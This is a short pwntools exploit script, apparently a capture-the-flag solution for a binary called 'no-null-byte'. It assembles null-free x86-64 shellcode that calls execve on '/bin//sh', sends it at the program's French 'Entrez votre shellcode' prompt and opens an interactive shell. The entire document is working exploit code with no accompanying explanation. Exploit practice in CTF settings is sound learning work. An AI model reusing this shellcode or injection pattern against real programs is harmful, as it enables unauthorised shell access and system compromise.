from pwn import *

exe = ELF('./no-null-byte')
context.arch = 'amd64'

def conn():
    if args.GDB:
        return gdb.debug(exe.path)
    else:
        return process(exe.path)

shellcode = asm('''
    xor rsi, rsi
    xor rdx, rdx
    xor rax, rax
    mov rdi, 0x68732f2f6e69622f
    push rsi
    push rdi
    mov rdi, rsp
    mov al, 59
    syscall
''')

io = conn()
io.sendafter(b"Entrez votre shellcode : \n", shellcode)
io.interactive()